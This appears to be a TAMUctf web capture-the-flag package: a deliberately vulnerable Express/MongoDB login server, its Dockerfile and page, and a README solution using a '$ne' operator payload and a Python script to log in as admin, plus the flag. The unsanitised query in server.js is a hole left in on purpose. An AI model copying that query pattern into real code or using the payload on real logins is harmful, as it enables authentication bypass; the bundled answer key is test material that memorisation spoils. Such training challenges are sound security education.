{
    "db.js": "const assert = require(\"assert\");\nconst client = require(\"mongodb\").MongoClient;\n\nlet _db;\n\nmodule.exports = {\n    getDb,\n    initDb\n};\n\nfunction initDb(callback) {\n    if (_db) {\n        console.warn(\"Trying to init DB again!\");\n        return callback(null, _db);\n    }\n\n    client.connect('mongodb://localhost:27017',  { useNewUrlParser: true },  connected);\n\n    function connected(err, db) {\n        if (err) {\n            return callback(err);\n        }\n        console.log(\"DB initialized - connected to: \" );\n        _db = db;\n        return callback(null, _db);\n    }\n}\n\nfunction getDb() {\n    assert.ok(_db, \"Db has not been initialized. Please called init first.\");\n    return _db;\n}\n\n\n",
    "Dockerfile": "FROM ubuntu:latest\n\nCOPY db.js .\nCOPY server.js .\nCOPY index.html .\nCOPY entry.sh .\n\nRUN mkdir -p /data/db\nRUN apt update && apt install -y nodejs npm\nRUN apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 9DA31620334BD75D9DCB49F368818C72E52529D4\nRUN echo \"deb [ arch=amd64 ] https://repo.mongodb.org/apt/ubuntu bionic/mongodb-org/4.0 multiverse\" | tee /etc/apt/sources.list.d/mongodb-org-4.0.list\nRUN apt update\nRUN export DEBIAN_FRONTEND=noninteractive && apt install -y mongodb-org\nRUN ln -fs /usr/share/zoneinfo/America/Chicago /etc/localtime\nRUN dpkg-reconfigure --frontend noninteractive tzdata\nRUN npm install express mongodb\n\nEXPOSE 80\n\nENTRYPOINT [\"./entry.sh\"] \n",
    "entry.sh": "#!/bin/bash\n\nmongod --quiet 1>/dev/null &\nsleep 5s;\nnode server.js\n",
    "index.html": "<html>\n    <head>\n    <title>TAMUctf</title>\n    <script src=\"https://code.jquery.com/jquery-3.3.1.min.js\"></script>\n    <style class=\"cp-pen-styles\">@import url(https://fonts.googleapis.com/css?family=Roboto:300);\n\n    .login-page {\n      width: 360px;\n      padding: 8% 0 0;\n      margin: auto;\n    }\n    .form {\n      position: relative;\n      z-index: 1;\n      background: #FFFFFF;\n      max-width: 360px;\n      margin: 0 auto 100px;\n      padding: 45px;\n      text-align: center;\n      box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24);\n    }\n    .form input {\n      font-family: \"Roboto\", sans-serif;\n      outline: 0;\n      background: #f2f2f2;\n      width: 100%;\n      border: 0;\n      margin: 0 0 15px;\n      padding: 15px;\n      box-sizing: border-box;\n      font-size: 14px;\n    }\n    .form button {\n      font-family: \"Roboto\", sans-serif;\n      text-transform: uppercase;\n      outline: 0;\n      background: #4CAF50;\n      width: 100%;\n      border: 0;\n      padding: 15px;\n      color: #FFFFFF;\n      font-size: 14px;\n      -webkit-transition: all 0.3 ease;\n      transition: all 0.3 ease;\n      cursor: pointer;\n    }\n    .form button:hover,.form button:active,.form button:focus {\n      background: #43A047;\n    }\n    .form .message {\n      margin: 15px 0 0;\n      color: #b3b3b3;\n      font-size: 12px;\n    }\n    .form .message a {\n      color: #4CAF50;\n      text-decoration: none;\n    }\n    .form .register-form {\n      display: none;\n    }\n    .container {\n      position: relative;\n      z-index: 1;\n      max-width: 300px;\n      margin: 0 auto;\n    }\n    .container:before, .container:after {\n      content: \"\";\n      display: block;\n      clear: both;\n    }\n    .container .info {\n      margin: 50px auto;\n      text-align: center;\n    }\n    .container .info h1 {\n      margin: 0 0 15px;\n      padding: 0;\n      font-size: 36px;\n      font-weight: 300;\n      color: #1a1a1a;\n    }\n    .container .info span {\n      color: #4d4d4d;\n      font-size: 12px;\n    }\n    .container .info span a {\n      color: #000000;\n      text-decoration: none;\n    }\n    .container .info span .fa {\n      color: #EF3B3A;\n    }\n    body {\n      background: #76b852; /* fallback for old browsers */\n      background: -webkit-linear-gradient(right, #76b852, #8DC26F);\n      background: -moz-linear-gradient(right, #76b852, #8DC26F);\n      background: -o-linear-gradient(right, #76b852, #8DC26F);\n      background: linear-gradient(to left, #76b852, #8DC26F);\n      font-family: \"Roboto\", sans-serif;\n      -webkit-font-smoothing: antialiased;\n      -moz-osx-font-smoothing: grayscale;      \n    }</style>\n    </head>\n    <div class=\"login-page\">\n      <div class=\"form\">\n        <form class=\"register-form\">\n          <input type=\"text\" placeholder=\"name\"/>\n          <input type=\"password\" placeholder=\"password\"/>\n          <input type=\"text\" placeholder=\"email address\"/>\n          <button>create</button>\n        </form>\n        <form class=\"login-form\">\n          <input id=\"username\" type=\"text\" placeholder=\"username\"/>\n          <input id=\"password\" type=\"password\" placeholder=\"password\"/>\n          <button id=\"submit\">login</button>\n        </form>\n      </div>\n    </div>\n\n    <script>\n        $(\"#submit\").on('click', function(){\n            $.ajax({\n                url: 'login', \n                type : \"POST\", \n                dataType : 'json', \n                data : JSON.stringify({\"username\": $(\"#username\").val(), \"password\": $(\"#password\").val()}),\n                contentType: 'application/json;charset=UTF-8',\n                success : function(result) {\n                    $(\".result\").html(result);\n                    console.log(result);\n                    alert(result);\n                },\n                error: function(xhr, resp, text) {\n                    $(\".result\").html(\"Something went wrong\"); \n                    console.log(xhr, resp, text);\n                }\n            })\n        });\n    </script>\n\n    </body>\n</html>\n",
    "README.md": "# NoSQL Injection\nObjective is for the player to perform a NoSQL injection on the login page and login as admin.\n\n## Setup\nBuild and run docker container\n\n## Solution\nThe standard NoSQL injection for MongoDB is `{\"username\": {\"$ne\": \"null\"}, \"password\": {\"$ne\": \"null\"}}`. This is will return the login as the first user in the DB. Since the first user entered into the DB is bob the injection has to be modified to: `{\"username\": \"admin\", \"password\": {\"$ne\": \"null\"}}`. The injection will have to either be done from the console or a script since the normal login form will escape the user input.  \nThe easiest way to do the injection is:\n```python\nimport requests\nurl = \"http://localhost:4000/login\"\ndata = {\"username\": \"admin\", \"password\": {\"$ne\": \"null\"}}\nr = requests.post(url, json=data)\nprint r.text\n```\n",
    "server.js": "// server.js\n\nconst initDb = require(\"./db\").initDb;\nconst getDb = require(\"./db\").getDb;\nconst express = require('express');\nconst app = express();\nvar bodyParser = require('body-parser')\napp.use(bodyParser.json())\n\nvar path = require(\"path\");\n\nconst PORT = 80;\n\ninitDb(function (err) {\n    app.get('/', function(req, res) {\n        res.sendFile(path.join(__dirname+'/index.html'));\n    });  \n\n    app.post('/login', function (req, res) {\n\n        const db = getDb();\n        c = db.db('test');\n    \n        var query = {\n            username: req.body.username,\n            password: req.body.password\n        }\n\n        c.collection('users').findOne(query, function (err, user) {\n            if(user == null) {\n                res.send(JSON.stringify(\"Login Failed\"))\n            }\n            else {\n                resp = \"Welcome: \" + user['username'] + \"!\";\n                if(user['username'] == \"admin\")\n                    resp += \"\\ngigem{n0_sql?_n0_pr0bl3m_8a8651c31f16f5dea}\"\n\n                res.send(JSON.stringify(resp));\n            }\n        });\n    });\n \n    app.listen(PORT, function (err) {\n        const db = getDb();\n\n        user = {username: 'bob', password: 'lVeYMg4U4$@L'}\n        admin = {username: 'admin', password: '945IYMib!u@u'}\n\n        c = db.db('test');\n        c.collection('users').insertOne(user)\n        c.collection('users').insertOne(admin)\n\n        if (err) {\n            throw err; //\n        }\n        console.log(\"Up and running on port \" + PORT);\n    });\n});\n",
    "category": "Web"
}